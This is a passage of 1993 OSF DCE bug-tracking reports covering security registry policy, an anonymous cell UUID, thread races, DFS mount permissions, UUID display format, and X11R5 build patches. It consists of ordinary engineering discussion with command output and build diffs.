The specify in hours was correct until we let you specify the kerberos type
lifetime units described above.  Now if you don't specify a unit it will
default to hours.  If you specify any units, you must do it in the form
above, and if you specify 'lifetime' it defaults to 0 (which is forever).
We need to figure out how to say that all in one prompt.

>(2) When viewing an account, if the auth policy has not been changed, the
>values for "max certificate lifetime" and "max certificate renewable lifetime"
>are shown as "default-policy" upon a "view -f".  Once they've been
>changed to some numeric value, the values shown are the numeric values of what
>they've been changed to, even if that value is greater than the registry auth
>pol value. If they've been changed to "forever", the values shown go back to
>"default-policy".

If the auth policy has never been modified via rgy_edit for a specific acct,
then it doesn't even exist in the registry (it's unique in this way).  That's
why all it can tell you is that it's 'default-policy'.  If they're set to
'forever' then it really isn't valid forever, it's valid for the lifetimes
in the RGY's auth policy (which is <= your auth policy if yours is forever).

>Suggestion:
>A) Upon a full view of an account, values for "max certificate lifetime" and
> "max certificate renewable lifetime" should show the numeric values of the
> account policy (if set) AND the numeric values of the policy in effect (which
> should be the shorter of the account policy and the registry policy).
We'll consider printing the "effective auth policy" too.

Note that a lot of the prompts may be improved when we redo them all for the
DCE1.1 i18n work... and hopefully the output labels can be improved a little
too.



CR Number                     : 7779
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : lack of concurrancy control on secd cred. refresh
Reported Date                 : 4/21/93
Found in Baseline             : 1.0.2
Found Date                    : 4/21/93
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/21/93 public]

This defect report is extracted from 7751 so that it can be closed.

There may be a problem with concurrancy control on ticket refresh in the
rs_login module.  There's no guarantee that there is the proper amount of
interlocking between clients using the security server's machine principal
and sec. principal contexts, and the thread(s) refreshing them.

It's also not clear why we need two threads to do this when one thread
could conceivably handle both.

[8/2/93 public]

Responsible engineer -> hanfei.

[10/13/93 public]

potential (but not seen yet) concurrancy problem on refresh.



CR Number                     : 7770
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : need well known anonymous cell uuid for security
Reported Date                 : 4/21/93
Found in Baseline             : 1.0.2
Found Date                    : 4/21/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[4/21/93 public]
When an unauthenticated user creates a file, acl_edit can't comprehend the
realm UUID in the file's ACL.  It is indeed a bogus UUID, consisting of
-2 in the first word, and zeroes in the other three words.  This UUID was
assigned to the unauthenticated user (i.e. put into his PAC) by the fshost
module of DFS, in order to avoid assigning any legitimate realm UUID to the
unauthenticated user.
Sample output, courtesy of Shepherd B. Shi, who added annotations:
# dce_login cell_admin -dce-
Password must be changed!
# exit
# klist | grep principal
Default principal: hosts/sos.austin.ibm.com/self@sos.cell.austin.ibm.com
# touch foo1
# acl_edit foo1 -l
/***********?????!!!!!! **********************************************/
Unknown default cell from ACL - ERROR: Cell UUID is not a valid cell name (
dce / sec)
INFO: Local cell will be used for operations requiring default cell info.
# SEC_ACL for foo1:
/***********Wrong default cell ****************************************/
# Default cell = fffffffe0000.00.00.00.00.00.00.00.00
user_obj:rw-c--
group_obj:rw----
other_obj:rw----
/***********Where is this from? **************************************/
foreign_other:/.../sos.cell.austin.ibm.com:rw----
The "foreign_other" entry is a separate problem, probably a bug in Episode,
and is not relevant to this bug.
The fshost module, when handling an unauthenticated user, should use a
realm UUID that acl_edit will be able to understand.  I suggest that there
should be a well-known realm UUID that does not represent any real realm,
but is understood as such by the fshost module and by acl_edit.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[5/23/93 public]
Why is this listed as a test defect instead of code?

[5/23/93 public]
Filled in Interest List CC with `lhughes@austin.ibm.com'

[5/24/93 public]
I have no idea why this was "test" rather than "code".  No wonder no one found
it.
Changed CR in Code, Doc, or Test? from `test' to `code'

[8/17/93 public]
                                                                              
For the record, I am posting our recent discussion (between Burati and Tu) 
on this issue at the end. 
Assign this to Elliot to coordinate the task among OSF, HP and Transarc.
                                                                              
From: burati@apollo.hp.com
Date: Tue, 17 Aug 93 13:29:25
Subject: Re: ot7770 and acl_edit
To: Shu-Tsui_Tu@transarc.com
Cc: pato@apollo.hp.com, frisco@apollo.hp.com, rsalz@osf.org, dmackey@osf.org
                                                                              
> It is nice to hear back... This is with regard to ot7770. Attached at the end
> is a copy of the ot report for that defect.
> Briefly speaking, when an anonymous user creates a file, the (uid, gid) is
>            42949672944294967294      0 Aug 17 10:34 anony
> however, acl_edit -l on this will get spurious message like :
> # acl_edit anony -l
> Unknown default cell from ACL - ERROR: Cell UUID is not a valid cell name (dce / sec)
> INFO: Local cell will be used for operations requiring default cell info.
> # SEC_ACL for anony:
> # Default cell = fffffffe0000.00.00.00.00.00.00.00.00
> user_obj:rw-c--
> group_obj:r-----
> other_obj:r-----
This is correct behavior because it is an unknown cell uuid (it can only know
about cell uuid's that succeed when passed to sec_id_gen_name() ).    
> If we can define a well-know cell uuid for the anonymous cell, then the
> problem would be resolved.
                                                                              
True, but that deserves some thought and planning, to make sure we come up
with a correct concept for an anonymous cell for all possible uses, not just
to change the acl_edit behavior.
> The DFS server currently assigns "-2" or (65534 for SUN) to frist 32
> bits of the cell uuid, group uuid and user uuid respectively upon detecting
> the caller is an unauthenticated.
> Unless, you have other suggestions, we would like to propose using "-2" (i.e.,
> fffffffe0000.00.00.00.00.00.00.00.00) or  "65534" (in the case of running on
> Solaris) as the well-known cell uuid representing the "unknown" cell.
                                                                              
I didn't like the idea of this, but couldn't think of a concrete reason off the
top of my head as to why it was a bad idea, so I left Joe some vmail (he's out
on business, then vacation for a while) and just got a reply.  Here's a summary
of his opinion:
                                                                              
This is bad, because it's not a legal uuid.  A cell uuid must be a legal
principal uuid, which means it must be tagged internally so that it can be
recognized as a valid principal uuid. It seems that we need to come up with
a well known anonymous cell id...
                                                                              
> If we agree on this, the remaining work is just to modify acl_edit.
We agree that something needs to be done.  This will take more effort than just
going ahead and doing it (to make sure the parse name and gen name calls can
handle it, and that it's recognized correctly by anything that might receive
it...), which will most likely not happen (or be allowed to happen by OSF) for
1.0.3.  Joe didn't seem certain has to how we should go about defining (and
creating a default principal for?) the well known anonymous id, and neither of
us will have much time to work on it in the next couple of weeks, but we should
keep it on the list of things that need to be worked out...  Maybe this should
be brought up on the tech conf call (Rich, Dick?)
                                                                              
..Mike
-------
Changed Interest List CC from `lhughes@austin.ibm.com' to 
 `lhughes@austin.ibm.com, tu@transarc.com' 
Changed Responsible Engr. from `bwl@transarc.com' to `jaffe@transarc.com'

[8/17/93 public]
I wanted to be aware of the verdict with respect to "nobody."
Changed Interest List CC from `lhughes@austin.ibm.com, tu@transarc.com' to 
 `lhughes@austin.ibm.com, tu@transarc.com, jeff@transarc.com'

[8/18/93 public]
I'm assigning this to security, since the main problem here seems to be the
definition of an anonymous cell id.  When this issue is decided, we will need
at least three defects, one for changes to acl_edit and security, one for DFS,
and one for doc changes.
Changed H/W Ref Platform from `pmax' to `all' 
Changed S/W Ref Platform from `osf1' to `all' 
Changed Short Description from `acl_edit chokes on file created by unauth user' 
 to `need well known anonymous cell uuid for security' 
Changed Responsible Engr. from `jaffe@transarc.com' to `burati@apollo.hp.com' 
Changed Resp. Engr's Company from `tarc' to `hp'

[08/18/93 public]
This is an enhancement request to add new functionality (an anonymous cell id)
and cannot be addressed in 1.0.3, changed to fixby 1.1.  Added Walt to the CC
list, because he would like to keep informed on what's happening with this.



CR Number                     : 7740
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : thdio_3
Short Description             : possible deadlock/races in cma_dup2
Reported Date                 : 4/16/93
Found in Baseline             : 1.0.2
Found Date                    : 4/16/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
	threads/cma_thdio_3.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/16/93 public]

There are two possible races in cma_dup2 (observed while looking for other
cma__g_file locking problems):

1) if cma_dup2 is racing against cma_close on one or the other of the file
descriptors (and cma_close wins), then the entry in cma__g_file may get
stomped to NULL, resulting in a crash.

2) if cma_dup2(a, b) is racing against cma_dup2(b, a), we can deadlock due
to a lock ordering problem.

[10/14/93 public]

add this to the above list:

3) before we deadlock as in 2), above, we can get the assertion "attempt
   to relock a mutex" because both file descriptors refer to the same 
   cma file object and reserving 'a' also reserves 'b'. This happens when 
   both 'a' and 'b' are already open.

4) if another thread closes a fd, cma_dup2 can think it has it (newd) 
   reserved, since it doesn't call cma__is_open(newd) a second time after 
   calling cma__fd_reserve(newd).

[10/14/93 public]

5) if newd == oldd, cma_dup2 increments the reference count; it should just 
   return 0 instead.

[10/20/93 public]
Have fix to check if the file is still open after a possible wait for 
reserve mutex but do not have fix for two calls with opposing file
descriptors. Defered.



CR Number                     : 7734
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : dfs
Subcomponent Name             : 
Short Description             : delmount/crmount permissions
Reported Date                 : 4/15/93
Found in Baseline             : 1.0.2b23
Found Date                    : 4/15/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[4/15/93 public]
As unix user root, DCE principal hosts/<machine>/self, I'm able to 
fts delmount a mount point I'm not authorized to create - I shouldn't
be able to delete it in the first place then, right?
 
root@dce12> fts delmount -dir /:/epi_1
root@dce12> ls /:
dce12_u3
root@dce12> fts crmount -dir /:/epi_1 -fileset epi.1
fts crmount: error making mount point for /:/epi_1: Permission denied
root@dce12> klist
DCE Identity Information:
        Global Principal: /.../p102_cell.qadce.osf.org/hosts/dce12/self

[4/16/93 public]
Mike's going to have to speak to the permission issue here.
Changed Responsible Engr. from `pakhtar' to `kazar' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[4/26/93 public]
Mike explained why crmount deserves "c" permission - a cell's file namespace
can get pretty crazy otherwise. He said he could be convinced that delmount
ALSO deserves "c" permission - which is what I'd like to see. Please consider
this OT a request to make the delmount/crmount permissions equal by requiring
"c" privilege to delmount, just as it is currently required to crmount.

[4/26/93 public]
When Mike explained his reasoning on this difference to me back in February,
I thought his explanation made good sense.  Basically, you don't want someone
creating a mount point in a directory that you control.  Conversely, you may
want to delete a mount point for which you don't have the control permission
(for example, were an unwanted mount point to somehow be created in a directory
that I control, I may want to get rid of it).
I'm usually very big on consistency, but this difference doesn't bother me.
I would rather it be canceled than made an enhancement.  Either way, as its
outcome affects me, I am including myself on its cc list.
Filled in Interest List CC with `jeff@transarc.com'

[4/27/93 public]
Sorry, my last explanation is misleading at best.  Essentially, it's more
important that a user not be able to create a mount point without c permission
than that the user not be able to delete a mount point without c permission.
I don't want someone creating a mount point in a directory in which they should
be able only to insert actual data. The consistency question is probably a
reasonable one, but I still believe that it is not very important; perhaps
leaving this an enhancement is a reasonable request.  Sorry for my inadvertent
confusion.

[4/23/93 public]
Changed to an enhancement request. This has always been a "2" so I've left
the priority alone.



CR Number                     : 7714
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : adver, server
Short Description             : uuid_from_string isn't needed in init code
Reported Date                 : 4/13/93
Found in Baseline             : 1.0.2
Found Date                    : 4/13/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/13/93 public]

Please note that this is an enhancement request (of the code-cleanup
variety).

There are a surprising number of places in the CDS code which call
uuid_from_string to initialize a "constant" uuid.

They should really just initialize it at compile time (use the format of
the output of uuidgen -s) and save some microseconds and code space in
their initialization code..

(I discovered this by running into a bug in the HP-UX sscanf & ungetc,
which wants to write to constant strings; if you compile with the option to
put character constants into read-only storage, cdsadv and cdsd, and
possibly others, crump at startup time).



CR Number                     : 7690
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : cdscp displays RPC_ObjectUUIDs incorrectly
Reported Date                 : 4/12/93
Found in Baseline             : 1.0.2
Found Date                    : 4/12/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/12/93 public]
RPC_ObjectUUIDs are not printed out in UUID string representation.  E.g.

% cdscp show obj /.:/hosts/bachmann.austin.ibm.com/cds-server

                        SHOW
                      OBJECT
/.../bachmann.cell.austin.ibm.com/hosts/bachmann.
austin.ibm.com/cds-server
                          AT   1993-03-15-02:47:53
            RPC_ClassVersion = 0100
             RPC_ObjectUUIDs = 40e5f2fab858ca11a04a08002b12a70d
                     CDS_CTS =
1993-03-04-21:34:07.582730100/10-00-5a-4f-34-28
                     CDS_UTS =
1993-03-04-21:35:13.354946100/10-00-5a-4f-34-28
                   CDS_Class = RPC_Entry
            CDS_ClassVersion = 1.0
                  CDS_Towers = :
                       Tower = ncadg_ip_udp:129.35.67.162[]

RPC_ObjectUUIDs should be = faf2e540-58b8-11ca-a04a-08002b12a70d

as in 

% rpccp show mapping -o faf2e540-58b8-11ca-a04a-08002b12a70d

mappings:

  <object>         faf2e540-58b8-11ca-a04a-08002b12a70d
  <interface id>   47b333318000.0d.00.01.dc.6c.00.00.00,0.0
  <string binding> ncadg_ip_udp:129.35.67.162[2276]
  <annotation>     cdsd [12536]

    <Note by jsirkin (Jeanne Sirkin), 93/04/12 08:35:56, action: note>

The format of the object uuid differs between what cdscp show  and rpccp
show
mapping. For example:

[root@dryden]  # cdscp show obj /.:/subsys/ibm/cet/dryden.Bank.Admin

                        SHOW
                      OBJECT
/.../banking.cet.austin.ibm.com/subsys/ibm/cet/dryden.Ban
k.Admin
                          AT   1993-04-09-04:55:53
            RPC_ClassVersion = 0100
             RPC_ObjectUUIDs = 90c78900358ac51b894210005a4f2d2a
                     CDS_CTS =
1993-03-26-19:42:13.830083100/10-00-5a-4f-2e-8f
                     CDS_UTS =
1993-04-09-14:37:42.776530100/10-00-5a-4f-2e-8f
                   CDS_Class = RPC_Entry
            CDS_ClassVersion = 1.0
                  CDS_Towers = :
                       Tower = ncadg_ip_udp:192.100.16.17[]
                  CDS_Towers = :
                       Tower = ncadg_ip_udp:192.100.15.17[]

but rpccp show mapping gives:

  <object>         0089c790-8a35-1bc5-8942-10005a4f2d2a
  <interface id>   b3159cf8-f59a-11c9-8020-02608c2ea88e,2.0
  <string binding> ncadg_ip_udp:192.100.16.17[3363]
  <annotation>     admin interface

  <object>         0089c790-8a35-1bc5-8942-10005a4f2d2a
  <interface id>   b3159cf8-f59a-11c9-8020-02608c2ea88e,2.0
  <string binding> ncadg_ip_udp:192.100.15.17[3363]
  <annotation>     admin interface

  <object>         0089c790-8a35-1bc5-8942-10005a4f2d2a
  <interface id>   88fdbace-f5a3-11c9-9999-02608c2ea88e,1.0
  <string binding> ncadg_ip_udp:192.100.16.17[3363]
  <annotation>     trans interface

  <object>         0089c790-8a35-1bc5-8942-10005a4f2d2a
  <interface id>   88fdbace-f5a3-11c9-9999-02608c2ea88e,1.0
  <string binding> ncadg_ip_udp:192.100.15.17[3363]
  <annotation>     trans interface

So to summarise:

cdscp show gives:            RPC_ObjectUUIDs =
90c78900358ac51b894210005a4f2d2a
rpccp show mapping gives: <object>
0089c790-8a35-1bc5-8942-10005a4f2d2a

the top part of this object UUID seems switched around:
90c78900 becomes 0089c790c790 
358a becomes 8a35
c51b becomes 1bc5

Exactly!  And as near as I can tell, the format used by rpccp is the
correct 
one.  Note that cdscp show cell /.: correctly formats the UUIDs.

% cdscp show cell /.:
Warning: you have no network credentials. All requests will be
unauthenticated.
                        SHOW
                        CELL   /.../perf.cell.austin.ibm.com
                          AT   1993-04-12-04:01:24
              Namespace Uuid = 000d584a-a4fb-1bb8-b1a2-10005ac9200f
          Clearinghouse Uuid = 0064afa0-a4f9-1bb8-b1a2-10005ac9200f
          Clearinghouse Name = /.../perf.cell.austin.ibm.com/dceperf_ch
                Replica Type =   Master
                       Tower = ncadg_ip_udp:129.35.68.52[]

The high 4 bits of the third field (time_hi_and_version) should always be
0001
(DCE version 1).

And, just for a bit more -- in the following, the RPC_Object UUIDs and
the CDS_ObjectUUID should be the same:

cdscp> show obj /.:/agony_ch RPC_ObjectUUIDs CDS_ObjectUUID

                        SHOW
                      OBJECT   /.../xinu.cell/agony_ch
                          AT   1993-04-12-09:37:36
             RPC_ObjectUUIDs = 162f740050c9bc1b89c010005aa88161
              CDS_ObjectUUID = 00742f16-c950-1bbc-89c0-10005aa88161

[4/13/92 public]
cdscp shows RPC_ObjectUUIDs as strings of hex digits because RPC stores them in
CDS attributes as uninterpreted byte strings. Has RPC chosen to store them with
an attribute syntax of uuid, cdscp would display them as rpccp does. You are
also seeing the effects of an endian mismatch; the uuid_to_string(3rpc)
function is byte swapping integer portions (sequence no. and version) of
the uuid.

If you think cdscp should special-case RPC_ObjectUUIDs attributes, please
reenter this as an enhancement request against cdscp, but I believe that
RPC should not have used an attribute syntax of byte. I'll defer to OSF to
arbitrate the decision of whose this CR should rightfully be directed --
for now I am changing the component name to RPC.

[4/16/93 public]
I'll hold off opening a cds feature until rpc decides how to deal with
this.  It's important that we comply with X/OPEN standards, whatever the
resolution is.  Note from Dave Bachman here:

OK, here's the X/OPEN argument for the OT defect.  Appendix A of the
Application
Environment Specification for RPC describe's the UUID.  Section A-3
describes
the format of a UUID string representation (in BNF with an example).  In
the
example above, the CDS_ObjectUUID conforms to this.  The RPC_ObjectUUID
does
not.  Also, in chapter 6 (describing RPC), section 6.2.3.3 describes the 
server_name object attributes in Table 6-3 (on page 6-18).  In the table, 
RPC_ObjectUUIDs is described as a set of uuid_t.  So cdscp is not
conforming to
appendix A-3 and NSI is not conforming to table 6-3.  If NSI changes, that
would
fix both problems.

Looking at the bits on the wire, I see that the byte-stream representations
are
different between the two values (RPC_ObjectUUIDs,CDS_ObjectUUID), if
that's 
relevant.

[4/20/93 public]
I asked about this on dce-tech:

As mentioned in OT 7690, cdscp displays RPC_ObjectUUIDs incorrectly. 
It turns out that the reason for this is that NSI is storing them on
the server in its own opaque format (just a byte stream as far as CDS
is concerned) and actually calls its own routines (nsuuid_to_uuid) to
convert from the little-endian format stored on the server into proper uuid_t type.

Not only does this cause cdscp to display RPC_ObjectUUIDs as a hex
dump, making them effectively useless and also violating the draft RPC
AES format for UUID string representation (section A-3).  This also
violates the RPC AES table defining what NSI stores on the server. 
Table 6-3 (on page 6-18) in section 6.2.3.3 describes the
server_name object attributes.  In the table, RPC_ObjectUUIDs is
described as a set of uuid_t.

I think we've got a problem here, if we want to be able to interoperate
with the X/OPEN spec (assuming the draft is blessed).

This seems a lot more serious than the uuid case issue.

I assume the folks who've been moving the AES along are on this list. 
Do you agree that this is a problem?

dave

Here is the response from Norbert Leser:

> Not only does this cause cdscp to display RPC_ObjectUUIDs as a hex
> dump, making them effectively useless and also violating the draft RPC
> AES format for UUID string representation (section A-3).  This also

That is correct, cdscp must display it in the specified UUID string 
representation.

> violates the RPC AES table defining what NSI stores on the server. 
> Table 6-3 (on page 6-18) in section 6.2.3.3 describes the
> server_name object attributes.  In the table, RPC_ObjectUUIDs is
> described as a set of uuid_t.

The table entry of the AES will be updated, stating that the UUID is stored
in little-endian - as it is also done for the other data types.
(BTW, the other data type for CDS_Towers will also be corrected from
protocol_tower to protocol_tower_t.)
The CDS/NSI implementation is right.

Norbert

[4/20/93 public]
While I am disappointed that NSI's behavior will be blessed, I can understand
the desire to avoid re-architecting NSI at this point in the game.

The end result, then, is that the AES will be modified to conform to NSI, and
cdscp needs to be modified to conform to the AES.

This needs an official response from OSF to confirm the above, at which point

[4/21/93 public]

This OT status is changed to a CDS enhancement.  The cdscp command should
display UUIDs in the format specified by the UUID Appendix of the RPC AES.
The UUID specification was included as an appendix to RPC for convenience.
It's scope is actually all of DCE.  While strictly speaking, the user
visible representation of a UUID is defined by the application which
displays it, it is neither convenient nor good design practice to choose
arbitrarily different representations in different applications.



CR Number                     : 7679
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : browser
Short Description             : browser doesn't build with X11R5 on HP-UX
Reported Date                 : 4/9/93
Found in Baseline             : 1.0.2
Found Date                    : 4/9/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
	directory/cds/cds.mk
	directory/cds/cdsbrowser/Makefile
	directory/cds/cdsbrowser/cds.c
	directory/cds/cdsbrowser/cds_browser.c
	directory/cds/cdsbrowser/cds_display.c
	directory/cds/cdsbrowser/pane.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/9/93 public]

The following is as a result of HP-UX reference platform work, and is an
enhancement request.  

1) the cdsbrowser doesn't build with X11R5; some code in cds_display.c
treats a GC as if it weren't an opaque data type.

2) there appear to be some VMS-ism's (or X11R3/Motif1.0 fallout??) in the
#includes in source files; there should never be a need to do a
-I/usr/include/X11 on any UNIX platform using X.

3) HP-UX 9.0 moves to X11R5 and Motif 1.2; HP800_INCLUDES and
HP800_LIBFLAGS needs to be changed in cds.mk

[4/9/93 public]

Needed changes (these will go in as part of the HP-UX reference platform
drop if I don't hear any objections):

*** /project/dce/build/dce1.0.2/src/directory/cds/cds.mk        Wed Feb  3 17:33:51 1993
--- ./cds.mk    Fri Apr  9 12:31:08 1993
***************
*** 371,378 ****
  MIPS_LIBFLAGS ?= -L/usr/lib/DXM/lib/Mrm -L/usr/lib/DXM/lib/DXm \
                   -L/usr/lib/DXM/lib/Xm -L/usr/lib/DXM/lib/Xt
  APOLLO68K_LIBS  += -ldce
! HP800_INCFLAGS  ?= -I/usr/include/Motif1.1 -I/usr/include/X11R4/X11
-I/usr/include/X11R4
! HP800_LIBFLAGS  ?= -L/usr/lib/X11R4 -L/usr/lib/Motif1.1
  HP800_LIBS      ?= ${HP_LIB_DCE} -lMrm -lXm -lXt -lX11 ${HP_LIB_COM}
  SVR4_LIBS       ?= ${SVR4_LIB_DCE} -lMrm -lXm -lXt -lX11
  .if (${TARGET_MACHINE}=="SVR4") && (${TARGET_OS_PLATFORM}=="PYRMIPS")
--- 379,386 ----
  MIPS_LIBFLAGS ?= -L/usr/lib/DXM/lib/Mrm -L/usr/lib/DXM/lib/DXm \
                   -L/usr/lib/DXM/lib/Xm -L/usr/lib/DXM/lib/Xt
  APOLLO68K_LIBS  += -ldce
! HP800_INCFLAGS  ?= -I/usr/include/Motif1.2 -I/usr/include/X11R5
! HP800_LIBFLAGS  ?= -L/usr/lib/X11R5 -L/usr/lib/Motif1.2
  HP800_LIBS      ?= ${HP_LIB_DCE} -lMrm -lXm -lXt -lX11 ${HP_LIB_COM}
  SVR4_LIBS       ?= ${SVR4_LIB_DCE} -lMrm -lXm -lXt -lX11
  .if (${TARGET_MACHINE}=="SVR4") && (${TARGET_OS_PLATFORM}=="PYRMIPS")

*** /project/dce/build/dce1.0.2/src/directory/cds/cdsbrowser/Makefile   Wed Dec 30 07:47:28 1992
--- ./cdsbrowser/Makefile       Fri Apr  9 12:23:27 1993
***************
*** 68,74 ****
  # compiler flags
  CFLAGS                = ${${TARGET_MACHINE}_CFLAGS}
  
! INCFLAGS        = -I../includes -I/usr/include/X11
${${TARGET_MACHINE}_INCFLAGS}
  
  # List of objects to build cdsbrowser
  cdsbrowser_OFILES = \
--- 72,78 ----
  # compiler flags
  CFLAGS                = ${${TARGET_MACHINE}_CFLAGS}
  
! INCFLAGS        = -I../includes ${${TARGET_MACHINE}_INCFLAGS}
  
  # List of objects to build cdsbrowser
  cdsbrowser_OFILES = \

*** /project/dce/build/dce1.0.2/src/directory/cds/cdsbrowser/cds.c      Wed Dec 30 07:47:34 1992
--- ./cdsbrowser/cds.c  Fri Apr  9 12:23:39 1993
***************
*** 67,73 ****
  #else
  #include <Xm/XmP.h>
  #include <Mrm/MrmPublic.h>
! #include <StringDefs.h>
  #include <Xm/Text.h>
  #include <X11/cursorfont.h>
  #endif
--- 74,80 ----
  #else
  #include <Xm/XmP.h>
  #include <Mrm/MrmPublic.h>
! #include <X11/StringDefs.h>
  #include <Xm/Text.h>
  #include <X11/cursorfont.h>
  #endif


*** /project/dce/build/dce1.0.2/src/directory/cds/cdsbrowser/cds_browser.c Wed Feb  3 17:35:11 1993
--- ./cdsbrowser/cds_browser.c  Fri Apr  9 12:23:43 1993
***************
*** 81,87 ****
  #include <Xm/RowColumn.h>
  #include <Xm/CascadeB.h>
  #include <Xm/PushB.h>
! #include <Shell.h>
  #endif
  
  #include <cds_decwmp.h>
--- 87,93 ----
  #include <Xm/RowColumn.h>
  #include <Xm/CascadeB.h>
  #include <Xm/PushB.h>
! #include <X11/Shell.h>
  #endif
  
  #include <cds_decwmp.h>

*** /project/dce/build/dce1.0.2/src/directory/cds/cdsbrowser/cds_display.c Wed Dec 30 07:48:00 1992
--- ./cdsbrowser/cds_display.c  Fri Apr  9 12:23:54 1993
***************
*** 59,65 ****
  #else
  #include <Xm/XmP.h>
  #include <Mrm/MrmPublic.h>
! #include <StringDefs.h>
  #include <Xm/Text.h>
  #include <X11/cursorfont.h>
  #endif
--- 70,76 ----
  #else
  #include <Xm/XmP.h>
  #include <Mrm/MrmPublic.h>
! #include <X11/StringDefs.h>
  #include <Xm/Text.h>
  #include <X11/cursorfont.h>
  #endif
***************
*** 1598,1604 ****
                       **  Get and set the font if necessary
                       */
                           compfont = DisplayFont (w, entry, comp);
!                          if (gc->values.font != compfont->fid) XSetFont
(XtDisplay(w), gc, compfont->fid);
  
  
                       /*
--- 1609,1615 ----
                       **  Get and set the font if necessary
                       */
                           compfont = DisplayFont (w, entry, comp);
!                          XSetFont (XtDisplay(w), gc, compfont->fid);
  
  
                       /*
***************
*** 1804,1810 ****
                       **  Get and set the font if necessary
                       */
                           compfont = DisplayFont (w, entry, comp);
!                          if (gc->values.font != compfont->fid) XSetFont
(XtDisplay(w), gc, compfont->fid);
  
  
                       /*
--- 1815,1821 ----
                       **  Get and set the font if necessary
                       */
                           compfont = DisplayFont (w, entry, comp);
!                          XSetFont (XtDisplay(w), gc, compfont->fid);
  
  
                       /*
*** /project/dce/build/dce1.0.2/src/directory/cds/cdsbrowser/pane.c     Wed Dec 30 07:48:53 1992
--- ./cdsbrowser/pane.c Fri Apr  9 12:24:02 1993
***************
*** 55,61 ****
  #else
  #include <Xm/XmP.h>
  #include <Mrm/MrmPublic.h>
! #include <StringDefs.h>
  #include <Xm/Text.h>
  #include <X11/cursorfont.h>
  #endif
--- 62,68 ----
  #else
  #include <Xm/XmP.h>
  #include <Mrm/MrmPublic.h>
! #include <X11/StringDefs.h>
  #include <Xm/Text.h>
  #include <X11/cursorfont.h>
  #endif



CR Number                     : 7659
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : registry and sec_clientd
Short Description             : uid's and gid's are incompatible between DCE and OSF/1.
Reported Date                 : 4/6/93
Found in Baseline             : 1.0.2
Found Date                    : 4/6/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/6/93 public]

   The default accounts in the registry are incompatible with OSF/1 as
   shipped by OSF. There was a discussion of this topic on dce-tech.
   Having not heard any blinding disagreement. I'm submitting this OT
   defect as an enhancement. Basically, the text below (from the last
   message from the dce-tech exchange) outlines a fix.


        Well, Joe asked for a concrete proposal, so here it is. Assuming
        there's not massive disagreement with this (how could there be
        on dce-tech? :-)), I'll submit this as an OT enhancement.

	1) Modify the code in sec_login_setup_identity which handles login,
           so that accounts (and principals and groups) can be added using
           the password override file.

	   This would be done by adding the 'is password overriden?' check
           from sec_login_valid_and_cert to the code path in
           sec_login_setup_identity which has determined there's no registry
           info.
                                 
	   I see this as a necessary step in any fix to this issue.
           Specifically, note from my original message on this subject:

> 
>         uid             mail    6(dce)          -(osf1)
>                         auth    -(dce)          6(osf1)
>
>         "-" indicates "not defined"
>

	  Since DCE doesn't have an 'auth', NOTHING can currently be
          done at an integrated login client of a (reference implementation)
          DCE environment to make that account accessible. Yes a vendor
          shipping OSF/1 with integrated login could make his installation
